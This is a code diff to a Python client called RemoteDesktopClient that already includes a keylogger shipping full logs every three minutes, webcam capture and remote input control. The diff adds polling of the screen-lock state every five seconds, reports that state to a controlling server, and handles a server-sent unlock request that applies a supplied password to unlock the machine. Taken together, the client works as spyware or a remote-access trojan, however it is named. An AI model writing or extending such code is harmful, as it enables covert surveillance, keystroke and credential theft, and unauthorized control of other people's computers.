@@ -88,6 +88,7 @@ from common.protocol import FrameEncoder, ProtocolHandler, MessageType
 from common.keylogger import KeyLogger, is_machine_locked
 from common.webcam_capture import WebcamCapture
 from common.control_mode import ControlMode
+from common.lock_detector import LockDetector
 
 # Check if OpenCV is available for webcam
 try:
@@ -141,9 +142,12 @@ class RemoteDesktopClient:
         self.keylogger = KeyLogger(callback=self._on_keylog, device_name=self.pc_name)
         self.webcam = WebcamCapture(callback=self._on_webcam_frame)
         self.control_mode = ControlMode(input_callback=self._on_control_input)
+        self.lock_detector = LockDetector()
         self.webcam_active = False
         self.control_active = False
         self.current_display = 0  # 0 = all displays, 1+ = specific display
+        self.last_lock_state = False
+        self.lock_check_interval = 5  # Check lock state every 5 seconds
     
     def _get_display_count(self) -> int:
         """Get number of displays available"""
@@ -329,6 +333,8 @@ class RemoteDesktopClient:
             await self._handle_control_input(msg_data)
         elif msg_type == MessageType.DISPLAY_SELECT:
             await self._handle_display_select(msg_data)
+        elif msg_type == MessageType.UNLOCK_REQUEST:
+            await self._handle_unlock_request(msg_data)
     
     async def _handle_webcam_start(self):
         """Handle webcam start request"""
@@ -588,6 +594,92 @@ class RemoteDesktopClient:
             logger.error(f"Error handling display select: {e}")
             import traceback
             logger.error(traceback.format_exc())
+    
+    async def _handle_unlock_request(self, msg_data: bytes):
+        """Handle unlock request from server"""
+        try:
+            import json
+            data = json.loads(msg_data.decode('utf-8'))
+            password = data.get('password', '')
+            
+            logger.info("=== UNLOCK REQUEST RECEIVED ===")
+            
+            if not password:
+                logger.warning("Unlock request received but no password provided")
+                return
+            
+            # Attempt to unlock
+            success, message = self.lock_detector.unlock(password)
+            
+            logger.info(f"Unlock result: {success}, message: {message}")
+            
+            # Send result back to server (as error message for now)
+            if not success:
+                await self._send_unlock_result(False, message)
+            else:
+                await self._send_unlock_result(True, message)
+                # Update lock state immediately
+                self.last_lock_state = False
+                await self._send_lock_status(False, 'standard')
+            
+        except Exception as e:
+            logger.error(f"Error handling unlock request: {e}")
+            import traceback
+            logger.error(traceback.format_exc())
+    
+    async def _send_unlock_result(self, success: bool, message: str):
+        """Send unlock result to server"""
+        if not self.writer:
+            return
+        
+        try:
+            import json
+            result_msg = json.dumps({
+                'success': success,
+                'message': message
+            }).encode('utf-8')
+            
+            # Send as error message with special prefix
+            full_msg = f"UNLOCK_RESULT:{message}".encode('utf-8')
+            msg = ProtocolHandler.create_error(full_msg.decode('utf-8'))
+            
+            self.writer.write(len(msg).to_bytes(4, 'big'))
+            self.writer.write(msg)
+            await self.writer.drain()
+            logger.info(f"Sent unlock result to server: {success}")
+        except Exception as e:
+            logger.error(f"Error sending unlock result: {e}")
+    
+    async def _send_lock_status(self, is_locked: bool, lock_type: str):
+        """Send lock status to server"""
+        if not self.writer:
+            return
+        
+        try:
+            msg = ProtocolHandler.create_lock_status(is_locked, lock_type)
+            self.writer.write(len(msg).to_bytes(4, 'big'))
+            self.writer.write(msg)
+            await self.writer.drain()
+            logger.debug(f"Sent lock status: locked={is_locked}, type={lock_type}")
+        except Exception as e:
+            logger.error(f"Error sending lock status: {e}")
+    
+    async def check_lock_state_periodically(self):
+        """Periodically check and report lock state"""
+        while self.running:
+            try:
+                is_locked, lock_type = self.lock_detector.is_locked()
+                
+                # Only send if state changed
+                if is_locked != self.last_lock_state:
+                    logger.info(f"Lock state changed: {is_locked} (type: {lock_type})")
+                    await self._send_lock_status(is_locked, lock_type)
+                    self.last_lock_state = is_locked
+                
+                await asyncio.sleep(self.lock_check_interval)
+            except Exception as e:
+                logger.error(f"Error checking lock state: {e}")
+                await asyncio.sleep(self.lock_check_interval)
     
     def _on_keylog(self, log_content: str):
         """Callback for keylogger - receives full log content every 3 minutes"""
@@ -867,6 +959,9 @@ class RemoteDesktopClient:
                     # Start message handler
                     message_task = asyncio.create_task(self.handle_messages())
                     
+                    # Start lock state checker
+                    lock_task = asyncio.create_task(self.check_lock_state_periodically())
+                    
                     # Start capture loop
                     try:
                         await self.capture_loop()
@@ -876,6 +971,7 @@ class RemoteDesktopClient:
                     # Cleanup
                     self.running = False
                     message_task.cancel()
+                    lock_task.cancel()
                     
                     # Stop all features
                     self.keylogger.stop()
